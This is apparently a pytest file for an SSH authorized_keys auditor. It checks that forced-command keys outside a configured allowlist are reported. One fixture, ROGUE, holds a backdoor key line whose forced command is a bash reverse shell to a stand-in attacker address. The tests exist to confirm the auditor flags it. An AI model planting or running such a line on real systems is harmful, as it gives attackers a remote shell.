# SPDX-License-Identifier: AGPL-3.0-or-later
# Copyright (c) 2026 Forex Robotics Co., Ltd.

"""#87: forced-command keys matching [audit] allowed_forced_commands are not
reported; others still are, with the command shown."""

from __future__ import annotations

from kevward.audit import _check_authkeys, forced_commands
from kevward.config import Config

COLLECT = ('command="/opt/kevward/bin/kevward report --trends --audit",no-pty '
           'ssh-ed25519 AAAA collect')
ROGUE = 'no-pty,command="bash -i >& /dev/tcp/203.0.113.9/4444 0>&1" ssh-rsa AAAA x'
PLAIN = "ssh-ed25519 AAAA ktakahashi@pc"


def _keys(tmp_path, *lines):
    p = tmp_path / "authorized_keys"
    p.write_text("\n".join(lines) + "\n")
    p.chmod(0o600)
    return [str(p)]


def test_parse_forced_commands():
    assert forced_commands(COLLECT) == ["/opt/kevward/bin/kevward report --trends --audit"]
    assert forced_commands('from="10.0.0.1",command="echo \\"hi\\"" ssh-rsa A') == ['echo "hi"']
    assert forced_commands(PLAIN) == []
    assert forced_commands("ssh-rsa AAAA note command=\"x\"") == []  # in the comment


def test_unlisted_forced_command_is_reported(tmp_path):
    f = _check_authkeys(None, _keys(tmp_path, COLLECT, PLAIN))
    assert len(f) == 1 and "1 forced-command" in f[0].title
    assert "/opt/kevward/bin/kevward report" in f[0].detail


def test_allowlisted_forced_command_is_silent(tmp_path):
    allow = ["/opt/kevward/bin/kevward report *"]
    assert _check_authkeys(allow, _keys(tmp_path, COLLECT, PLAIN)) == []


def test_allowlist_does_not_hide_other_keys(tmp_path):
    allow = ["/opt/kevward/bin/kevward report *"]
    f = _check_authkeys(allow, _keys(tmp_path, COLLECT, ROGUE))
    assert len(f) == 1 and "1 forced-command" in f[0].title
    assert "/dev/tcp" in f[0].detail


def test_config_loads_audit_section(tmp_path):
    p = tmp_path / "kevward.toml"
    p.write_text('[audit]\nallowed_forced_commands = ["rrsync *"]\n')
    assert Config.load(p).audit.allowed_forced_commands == ["rrsync *"]
    assert Config().audit.allowed_forced_commands == []
